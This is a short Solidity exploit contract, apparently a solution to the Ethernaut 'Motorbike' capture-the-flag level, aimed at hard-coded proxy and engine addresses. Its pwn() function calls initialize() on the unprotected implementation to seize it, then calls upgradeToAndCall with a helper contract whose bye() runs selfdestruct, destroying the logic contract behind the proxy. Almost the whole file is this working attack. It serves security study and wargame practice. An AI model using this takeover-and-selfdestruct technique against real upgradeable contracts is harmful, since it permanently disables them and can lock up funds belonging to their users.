// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

import {IMotorbike} from "./IMotorbike.sol";

contract New {
    function bye() public {
        selfdestruct(payable(address(0)));
    }
}

contract Evil26 {
    address motorbike = 0x62818867248F27dc5F68BE52f799f6f4A911FE86;
    address engine = 0x71203eCBFDC91C8a54bE03bf2963F4881E69A7DC;

    function pwn() external {
        engine.call(abi.encodeWithSignature("initialize()"));
        engine.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(new New()),
                abi.encodeWithSignature("bye()")
            )
        );
        // console.log(isContract(t));
        // require(!isContract(t), "pwn failed");
    }
}
